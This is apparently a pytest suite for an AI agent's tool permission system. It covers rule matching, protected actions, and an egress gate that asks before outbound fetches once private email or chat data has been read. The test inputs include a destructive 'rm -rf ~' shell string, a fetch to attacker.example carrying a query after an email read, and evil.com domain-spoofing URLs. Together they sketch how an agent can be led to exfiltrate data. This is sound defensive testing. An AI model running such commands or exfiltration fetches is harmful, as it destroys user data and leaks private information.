"""Permission rules of the new runtime as table tests (#62): rule, call -> decision."""

import json

import pytest

import src.tool_security as tool_security
from src.chat_agent import permissions
from src.chat_agent.permissions import ALLOW, ASK, DENY, Provenance, Rules, parse_rule
from src.chat_agent.routing import ComposerToggles


def _layers(rules=None):
    toggles = ComposerToggles(mode="agent", allow_bash="true", allow_web_search="true", use_web=None,
                              plan_mode=False, incognito=False, workspace=None)
    return permissions.build_deny_layers(
        owner="alice", toggles=toggles, privileges={}, delegated_credential=False,
        active_email_open=False, global_disabled_tools=[], rules=rules or Rules(),
    )


@pytest.fixture(autouse=True)
def admin(monkeypatch):
    monkeypatch.setattr(tool_security, "owner_is_admin_or_single_user", lambda owner: True)


def _decision(name, content, *, allow=(), ask=(), deny=(), session=(), provenance=Provenance(), owner="alice",
              workspace=None):
    rules = Rules.from_lists({"allow": list(allow), "ask": list(ask), "deny": list(deny)})
    session = tuple(parse_rule(text) if isinstance(text, str) else text for text in session)
    return permissions.decide(_layers(rules), name, content, rules=rules, session=session,
                              provenance=provenance, owner=owner, workspace=workspace)


def _decide(name, content, **kwargs):
    return _decision(name, content, **kwargs).outcome


def _email(to, **extra):
    return json.dumps({"to": to, "subject": "s", "body": "b", **extra})


@pytest.mark.parametrize(("rule", "name", "content", "matches"), [
    # Shell tools: the bare name covers the whole tool.
    ("bash", "bash", "git status; rm -rf ~", True),
    ("python", "python", "print(1)", True),
    ("host_shell", "host_shell", json.dumps({"command": "docker ps"}), True),
    # file tools: path glob.
    ("write_file(notes/*.md)", "write_file", "notes/a.md\nhello", True),
    ("write_file(notes/*.md)", "write_file", "src/a.py\nhello", False),
    ("edit_file(notes/*)", "edit_file", json.dumps({"path": "notes/a.md"}), True),
    ("read_file(secrets/*)", "read_file", "secrets/key", True),
    # web_fetch: domain.
    ("web_fetch(domain:example.com)", "web_fetch", json.dumps({"url": "https://example.com/a"}), True),
    ("web_fetch(domain:example.com)", "web_fetch", json.dumps({"url": "https://evil.com/?example.com"}), False),
    ("web_fetch(domain:*.example.com)", "web_fetch", json.dumps({"url": "https://api.example.com"}), True),
    # manage_*: action.
    ("manage_notes(action:delete)", "manage_notes", json.dumps({"action": "delete", "id": "1"}), True),
    ("manage_notes(action:delete)", "manage_notes", json.dumps({"action": "add"}), False),
    ("manage_tasks(action:create)", "manage_tasks", json.dumps({"task": "implicit create"}), True),
    # email sends: recipient pattern; the email spellings are one tool.
    ("send_email(to:*@example.com)", "mcp__email__send_email", _email("mom@example.com"), True),
    ("send_email(to:*@example.com)", "send_email", _email("mom@example.com", cc="x@evil.com"), False),
    ("mcp__email__send_email", "send_email", _email("a@b.c"), True),
    # MCP: the qualified name.
    ("mcp__github__create_issue", "mcp__github__create_issue", "{}", True),
    ("mcp__github__create_issue", "mcp__github__list_issues", "{}", False),
])
def test_allow_rule_matching(rule, name, content, matches):
    assert permissions.rule_covers(parse_rule(rule), name, content) is matches


@pytest.mark.parametrize("text", [
    "", "bash(", "bash()", "(git:*)", "web_search(domain:x.com)", "manage_notes(delete)",
    "web_fetch(example.com)", "send_email(mom@example.com)",
    # Shell command specifiers are not supported yet (2026-10-13).
    "bash(git:*)", "bash(npm test)", "python(print(1))", "host_shell(docker:*)",
])
def test_rules_outside_the_specifier_table_are_rejected(text):
    with pytest.raises(ValueError):
        parse_rule(text)


def test_deny_beats_ask_beats_allow():
    delete = json.dumps({"action": "delete", "id": "1"})
    add = json.dumps({"action": "add", "title": "x"})
    assert _decide("bash", "git push", allow=["bash"], deny=["bash"]) == DENY
    assert _decide("bash", "git push", allow=["bash"], ask=["bash"]) == ASK
    assert _decide("bash", "git push", allow=["bash"]) == ALLOW
    assert _decide("manage_notes", add, allow=["manage_notes"], ask=["manage_notes(action:delete)"]) == ALLOW
    assert _decide("manage_notes", delete, deny=["manage_notes(action:delete)"]) == DENY


def test_a_shell_tool_asks_by_default():
    assert _decide("bash", "ls") == ASK
    assert _decide("python", "print(1)") == ASK


def test_a_bare_deny_removes_the_tool_from_context():
    rules = Rules.from_lists({"deny": ["bash", "read_file(secrets/*)"]})
    layers = _layers(rules)
    assert "bash" in layers.denied_names
    assert "read_file" not in layers.denied_names


def test_ask_rule_turns_a_default_allow_into_an_ask():
    note = json.dumps({"action": "add", "title": "x"})
    assert _decide("manage_notes", note) == ALLOW
    assert _decide("manage_notes", note, ask=["manage_notes(action:add)"]) == ASK


@pytest.mark.parametrize(("name", "content"), [
    ("send_email", _email("mom@example.com")),
    ("mcp__email__send_email", _email("mom@example.com")),
    ("manage_settings", json.dumps({"action": "set", "key": "theme", "value": "dark"})),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "news", "output_target": "email:x@y.z"})),
    ("ui_control", "toggle bash on"),
    ("ui_control", "switch_model grok-4"),
    ("app_api", json.dumps({"method": "PUT", "path": "/api/prefs/theme", "body": {}})),
    ("manage_notes", json.dumps({"action": "delete", "id": "1"})),
])
def test_sensitive_actions_ask_even_with_an_allow_rule(name, content):
    tool = name.rsplit("__", 1)[-1]
    assert _decide(name, content, allow=[tool]) == ASK


def test_app_api_reads_follow_the_rules():
    get = json.dumps({"method": "GET", "path": "/api/hwfit/models"})
    assert _decide("app_api", get) == ASK
    assert _decide("app_api", get, allow=["app_api"]) == ALLOW


def test_a_session_rule_lifts_an_ask_but_never_a_deny():
    assert _decide("bash", "ls -la", session=["bash"]) == ALLOW
    assert _decide("send_email", _email("mom@example.com"), session=["send_email(to:mom@example.com)"]) == ALLOW
    assert _decide("bash", "ls", session=["bash"], deny=["bash"]) == DENY


@pytest.mark.parametrize(("name", "content", "protected"), [
    ("app_api", json.dumps({"method": "PUT", "path": "/api/tasks/1"}), True),
    ("app_api", json.dumps({"method": "post", "path": "/api/prefs"}), True),
    ("app_api", json.dumps({"path": "/api/hwfit/models"}), False),
    ("app_api", "not json", True),
    ("api_call", "github\nPOST /repos/x/issues", True),
    ("api_call", json.dumps({"integration": "github", "method": "GET", "path": "/user"}), False),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "email:a@b.co"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "a@b.co"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "email"}), True),
    ("manage_tasks", json.dumps({"action": "edit", "task_id": "1", "output_target": "mcp__slack__post"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "trigger_type": "webhook"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "trigger_type": "event",
                                 "trigger_event": "email_received"}), True),
    ("manage_tasks", json.dumps({"action": "create", "prompt": "p", "output_target": "session"}), False),
    ("manage_tasks", json.dumps({"action": "list", "output_target": "email"}), False),
    ("manage_settings", json.dumps({"action": "get", "key": "theme"}), True),
    ("bulk_email", "{}", True),
    ("vault_get", "{}", True),
    ("send_email", _email("a@b.c"), False),
])
def test_protected_set(name, content, protected):
    assert permissions.is_protected(name, content) is protected


def _email_read():
    return Provenance().after("mcp__email__read_email")


@pytest.mark.parametrize(("provenance", "name", "content", "expected"), [
    # Read an email body, then fetch an outside URL: the lethal trifecta.
    (_email_read(), "web_fetch", json.dumps({"url": "https://attacker.example/?q=x"}), ASK),
    # Pure research: external content, no private read.
    (Provenance().after("web_search").after("web_fetch"), "web_fetch",
     json.dumps({"url": "https://example.com"}), ALLOW),
    # Pure email reading: nothing goes out.
    (_email_read(), "manage_notes", json.dumps({"action": "add", "title": "x"}), ALLOW),
    # A private read alone (chat search) plus web content arms it too.
    (Provenance().after("search_chats").after("web_search"), "send_to_session",
     json.dumps({"session_id": "s", "message": "m"}), ASK),
    (Provenance().after("search_chats"), "web_fetch", json.dumps({"url": "https://example.com"}), ALLOW),
    # Memory and the workspace are neither leg.
    (Provenance().after("manage_memory").after("read_file"), "web_fetch",
     json.dumps({"url": "https://example.com"}), ALLOW),
    # A workspace fetch carries nothing out.
    (_email_read(), "web_fetch", json.dumps({"url": "/workspace/a.txt"}), ALLOW),
    # The open email preview is both legs.
    (Provenance(external=True, private=True), "web_fetch", json.dumps({"url": "https://x.example"}), ASK),
])
def test_egress_gate(provenance, name, content, expected):
    assert _decide(name, content, provenance=provenance) == expected


def test_neither_an_allow_rule_nor_a_session_rule_opens_the_egress_gate():
    # A redirect from an allowed host can carry the data anywhere.
    fetch = json.dumps({"url": "https://example.com/a"})
    assert _decide("web_fetch", fetch, allow=["web_fetch"], provenance=_email_read()) == ASK
    decision = _decision("web_fetch", fetch, session=["web_fetch(domain:example.com)"], provenance=_email_read())
    assert (decision.outcome, decision.chat_scope) == (ASK, False)


@pytest.mark.parametrize(("name", "content", "label"), [
    # Shell tools: "Allow for this chat" allows the whole tool in this chat.
    ("bash", "git status && rm -rf build", "bash"),
    ("host_shell", json.dumps({"command": "docker ps"}), "host_shell"),
    ("python", "print(1)", "python"),
    ("write_file", "notes/a.md\nhello", "write_file(notes/a.md)"),
    ("write_file", "notes/[a].md\nhello", "write_file(notes/[[]a].md)"),
    ("manage_notes", json.dumps({"action": "delete", "id": "1"}), "manage_notes(action:delete)"),
    ("mcp__email__send_email", _email("Mom@Example.com"), "send_email(to:mom@example.com)"),
    ("web_fetch", json.dumps({"url": "https://Example.com/a"}), "web_fetch(domain:example.com)"),
    ("mcp__github__create_issue", "{}", "mcp__github__create_issue"),
])
def test_allow_for_this_chat_saves_the_rule_for_the_call(name, content, label):
    rule = permissions.session_rule(name, content)
    assert rule.text == label
    assert permissions.rule_covers(parse_rule(rule.text), name, content)


@pytest.mark.parametrize(("name", "content"), [
    ("send_email", _email("mom@example.com", cc="boss@example.com")),
    ("app_api", json.dumps({"method": "PUT", "path": "/api/prefs/theme"})),
    # One approved task is not every task this chat creates.
    ("manage_tasks", json.dumps({"action": "create", "prompt": "news", "output_target": "prefs"})),
])
def test_calls_without_a_specifier_are_allowed_for_this_chat_only_when_identical(name, content):
    rule = permissions.session_rule(name, content)
    assert permissions.rule_covers(rule, name, content)
    assert not permissions.rule_covers(rule, name, content.replace("prefs", "tasks").replace("boss", "x"))
